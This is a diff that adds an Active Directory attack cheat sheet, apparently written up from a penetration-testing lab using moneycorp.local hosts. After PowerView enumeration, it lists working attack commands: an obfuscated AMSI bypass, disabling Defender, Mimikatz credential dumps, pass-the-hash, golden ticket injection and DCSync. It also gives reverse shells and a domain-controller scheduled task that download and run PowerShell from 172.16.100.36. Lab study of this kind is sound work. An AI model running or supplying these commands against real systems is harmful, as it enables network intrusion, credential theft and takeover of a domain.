@@ -1,0 +1,204 @@
+###Domain Enumeration
+
+To Get current domain: 
+Get-NetDomain (PowerView)
+
+Get-ADDomain (ActiveDirectory Module)
+
+Get object of another domain
+Get-NetDomain -Domain moneycorp.local (PowerView)
+
+Get-ADDomain -Identity moneycorp.local (ActiveDirectory Module)
+
+Getdomain SID for the current domain
+Get-DomainSID (PowerView)
+
+(Get-ADDomain).DomainSID (ActiveDirectory Module)
+
+Get domain policy for the current domain:
+Get-DomainPolicy (PowerView)
+(Get-DomainPolicy)."system access" (PowerView)
+
+Get domain policy for another domain:
+(Get DomainPolicy domain moneycorp.local)."system access" (PowerView)
+
+Get domain controllers for the current domain:
+Get-NetDomainController(PowerView)
+
+Get-ADDomainController(ActiveDirectory Module)
+
+Get domain controllers for another domain
+Get-NetDomainController -Domain moneycorp.local(PowerView)
+
+Get-ADDomainController -DomainName moneycorp.local -Discover(ActiveDirectory Module)
+
+Get a list of users in the current domain:
+Get-NetUser (PowerView)
+Get-NetUser -Username student1 (PowerView)
+
+Get-ADUser -Filter * -Properties * (ActiveDirectory Module)
+Get-ADUser -Identity student1 Properties * (ActiveDirectory Module)
+
+Get list of all properties for users in the current domain:
+Get-UserProperty (PowerView)
+Get-UserProperty -Properties pwdlastset (PowerView)
+
+Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name (ActiveDirectory Module)
+Get-ADUser -Filter * -Properties *| select name,@ {expression={[datetime]::fromFileTime ($_ .pwdlastset)}} (ActiveDirectory Module)
+
+Search for a particular string in a user's attributes:
+Find-UserField -SearchField Description -SearchTerm "built" (PowerView)
+Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name, Description (ActiveDirectory Module)
+
+Get a list of computers in the current domain:
+Get-NetComputer (PowerView)
+Get-NetComputer -OperatingSystem "*Server 2016*" (PowerView)
+Get-NetComputer -Ping (PowerView)
+Get-NetComputer -FullData (PowerView)
+
+Get-ADComputer -Filter * | select Name (ActiveDirectory Module)
+Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name, OperatingSystem (ActiveDirectory Module)
+Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_DNSHostName} (ActiveDirectory Module)
+Get-ADComputer -Filter * -Properties * (ActiveDirectory Module)
+
+Get all the groups in the current domain:
+Get-NetGroup (PowerView)
+Get-NetGroup -Domain targetdomain (PowerView)
+Get-NetGroup -FullData (PowerView)
+
+Get-ADGroup -Filter * | select Name (ActiveDirectory Module)
+Get-ADGroup -Filter * -Properties * (ActiveDirectory Module)
+
+Get all groups containing the word "admin" in group name:
+Get-NetGroup *admin* (PowerView)
+
+Get-ADGroup -Filter 'Name like "*admin*"' | select Name (ActiveDirectory Module)
+
+Get all the members of the Domain Admins group:
+Get-NetGroupMember -GroupName "Domain Admins" -Recurse (PowerView)
+Get-ADGroupMember -Identity "Domain Admins" -Recursive (ActiveDirectory Module)
+
+Get the group membership for a user: 
+Get-NetGroup –UserName "student1" (PowerView)
+Get-ADPrincipalGroupMembership -Identity student1 (ActiveDirectory Module)
+
+List all the local groups on a machine (needs administrator privs on non-dc machines) : 
+Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups (PowerView)
+
+Get members of all the local groups on a machine (needs administrator privs on non-dc machines):
+Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse (PowerView)
+
+Get actively logged users on a computer (needs local admin rights on the target):
+Get-NetLoggedon –ComputerName <servername> (PowerView)
+
+Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS):
+Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+Get the last logged user on a computer (needs administrative rights and remote registry on the target):
+Get-LastLoggedOn –ComputerName <servername>
+
+Find shares on hosts in current domain:
+Invoke-ShareFinder –Verbose
+
+Find sensitive files on computers in the domain:
+Invoke-FileFinder –Verbose
+
+Get all fileservers of the domain:
+Get-NetFileServer
+
+To bypass windows AMSI:
+
+powershell -ep bypass
+
+Bypass AMSI:
+PS C:\AD\Tools> sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+
+Disbale AMSI on remote machine who's session is stored in $sess:
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+
+Get all domain admins:
+
+Get-NetGroup -GroupName "Domain Admins" -FullData
+
+Tail a file and have a keyword hightlighted:
+
+tail -f alerts.json | perl -pe 's/keyword/\e[1;31;43m$&\e[0m/g'
+
+Get all users with local admin privileges:
+
+net localgroup administrators
+
+Temporarly disable windows defender if you have administrator priveleges:
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+To find local admin privelges for your current user using PowerView:
+
+Find-LocalAdminAccess -Verbose
+
+Get a session on the machine on which you have local admin privleges:
+PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student536\Documents>
+
+lateral movement using powershell remoting(one to one remoting):
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local #we had admin rights on this box
+
+$sess=New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+
+One to Many remoting or Fan-out Remoting:
+Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{whoami;hostname} #For executing commands on multiple remote computers
+
+Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath C:\AD\Tools\PowerUp.ps1 #execute file on adminsrv machine
+
+Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1  #execute file on session stored in $sess
+
+To find out what language mode is powershell running on:
+$ExecutionContext.SessionState.LanguageMode #type in powershell (Constrained language mode or Full language mode)
+#if applocker is configured powershell will run in constrained language mode
+
+#Enumerate applocker policy:
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+Dump Credentials on a local machine:
+Invoke-Mimikatz -DumpCreds
+
+Dump credentials on multiple remote machines.
+Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
+
+Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess #Run mimikatz on remote machine
+
+For user hunting:
+Invoke-UserHunter
+
+Invoke-UserHunter -Checkaccess
+
+Reverse shell using Invoke-PowerShellTCP:
+
+powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443 #function name changed to power
+
+powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.36/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.36 -Port 9001 #this one worked
+
+Dowload Powerview.ps1 and execute in-memory:
+
+iex (iwr http://172.16.100.36:8080/PowerView.ps1 -UseBasicParsing)
+
+Overpass the hash using mimikatz for lateral movement:
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash goes here> /run:powershell.exe"'
+
+Get access to domain administrator:
+PS C:\Windows\system32> whoami #if you tun whoami it will show your current user
+dcorp\student536
+PS C:\Windows\s3ystem32> Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local #have to run like this to know if we can execute command as domain admin
+dcorp\svcadmin 
+dcorp-dc
+
+Inject Golden ticket:
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+Getting the krbtgt account ntlm using dcsync:
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+Schedule  a task to download a reverse shell:
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.36:8080/Invoke-PowerShellTcp.ps1''')'"
+
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "UserX" #Run the task
